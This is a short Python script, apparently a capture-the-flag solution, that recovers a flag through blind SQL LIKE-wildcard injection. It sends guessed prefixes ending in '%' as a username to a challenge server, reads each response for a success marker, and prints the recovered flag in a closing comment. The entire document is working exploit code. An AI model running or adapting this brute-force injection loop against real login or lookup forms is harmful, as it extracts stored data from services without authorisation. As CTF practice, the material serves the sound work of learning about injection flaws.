import httpx
import asyncio
import string


async def check(name):
    async with httpx.AsyncClient() as client:
        r = await client.post(
            "https://like-it-or-not.031337.xyz/", data={"username": name}
        )
        return "sent" in r.text


async def main():
    chs = string.printable
    flag = "ictf{"
    while not flag.endswith("}"):
        for c in chs:
            if await check(flag + c.replace("_", "\\_").replace("%", "\\%") + "%"):
                flag += c
                break
        else:
            flag += "_"
        print(flag)


asyncio.run(main())

# ictf{n0t_4ll_1njections_ar3_creat3d_equ4l}
